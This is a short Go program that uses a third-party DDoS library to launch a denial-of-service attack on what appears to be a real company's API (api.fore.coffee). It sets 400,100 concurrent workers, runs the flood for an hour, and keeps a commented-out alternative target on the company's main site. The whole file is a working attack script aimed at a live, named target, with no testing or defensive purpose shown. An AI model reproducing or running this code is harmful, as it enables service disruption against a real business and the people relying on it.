package main

import (
	"time"

	ddos "github.com/Konstantin8105/DDoS"
)

func main() {
	workers := 400100
	//workers := 100
	d, err := ddos.New("https://api.fore.coffee/", workers)
//	d, err := ddos.New("https://fore.coffee/",workers)
	if err != nil {
		panic(err)
	}

	d.Run()
	time.Sleep(time.Hour)
	d.Stop()
	//fmt.Println("DDoS attack server: http://www.kita.com")
	// Output: DDoS attack server: http://127.0.0.1:80
}
